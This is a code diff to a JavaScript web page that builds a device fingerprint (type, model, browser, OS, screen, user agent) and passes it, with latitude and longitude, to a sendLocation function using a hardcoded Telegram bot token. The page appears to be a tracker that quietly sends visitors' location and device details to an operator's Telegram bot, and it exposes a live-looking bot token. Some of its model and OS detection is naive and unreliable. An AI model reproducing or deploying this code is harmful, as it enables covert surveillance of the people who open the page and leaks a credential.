@@ -61,8 +61,36 @@
             const screenWidth = window.screen.width;
             const screenHeight = window.screen.height;
             const deviceType = /mobile|tablet|ip(ad|hone|od)|android/i.test(userAgent) ? 'Mobile/Tablet' : 'Desktop';
+            const deviceModel = getDeviceModel(userAgent);
 
-            return `🖥 Device Details:\n• Device Type: ${deviceType}\n• Browser: ${browser}\n• OS: ${os}\n• Screen Resolution: ${screenWidth}x${screenHeight}\n• User Agent: ${userAgent}`;
+            return `🖥 Device Details:\n• Device Type: ${deviceType}\n• Model: ${deviceModel}\n• Browser: ${browser}\n• OS: ${os}\n• Screen Resolution: ${screenWidth}x${screenHeight}\n• User Agent: ${userAgent}`;
+        }
+
+        function getDeviceModel(userAgent) {
+            // Check for iPhone models
+            if (/iPhone/.test(userAgent)) {
+                if (/iPhone X|iPhone 10/.test(userAgent)) return "iPhone X/10";
+                if (/iPhone 12/.test(userAgent)) return "iPhone 12";
+                if (/iPhone 13/.test(userAgent)) return "iPhone 13";
+                if (/iPhone 14/.test(userAgent)) return "iPhone 14";
+                // Add more iPhone models as needed
+                return "iPhone (Unknown Model)";
+            }
+
+            // Check for iPad models
+            if (/iPad/.test(userAgent)) {
+                return "iPad (Unknown Model)";
+            }
+
+            // Check for Android models (simplified)
+            if (/Android/.test(userAgent)) {
+                if (/Pixel 5/.test(userAgent)) return "Google Pixel 5";
+                if (/Samsung Galaxy/.test(userAgent)) return "Samsung Galaxy (Unknown Model)";
+                // Add more Android models as needed
+                return "Android Device (Unknown Model)";
+            }
+
+            return "Unknown Device";
         }
 
         function detectBrowser(userAgent) {
@@ -75,20 +103,19 @@
         }
 
         function detectOS(userAgent) {
-    if (userAgent.indexOf("Windows NT 10.0") > -1) {
-        if (userAgent.indexOf("Windows 11") > -1) {
-            return "Windows 11"; // Specifically detects Windows 11
-        } else {
-            return "Windows 10"; // This is the fallback for Windows 10
+            if (userAgent.indexOf("Windows NT 10.0") > -1) {
+                if (userAgent.indexOf("Windows 11") > -1) {
+                    return "Windows 11"; // Specifically detects Windows 11
+                } else {
+                    return "Windows 10"; // This is the fallback for Windows 10
+                }
+            }
+            if (userAgent.indexOf("Mac") > -1) return "MacOS";
+            if (userAgent.indexOf("X11") > -1) return "Linux";
+            if (userAgent.indexOf("Android") > -1) return "Android";
+            if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) return "iOS";
+            return "Unknown OS";
         }
-    }
-    if (userAgent.indexOf("Mac") > -1) return "MacOS";
-    if (userAgent.indexOf("X11") > -1) return "Linux";
-    if (userAgent.indexOf("Android") > -1) return "Android";
-    if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) return "iOS";
-    return "Unknown OS";
-}
-
 
         function sendLocation(lat, lon, deviceInfo) {
             const botToken = "8053207965:AAFxT4UzNGdzjiqNzkpjorMlXXz7cHNF6q0"; // 🔴 Replace with your bot token
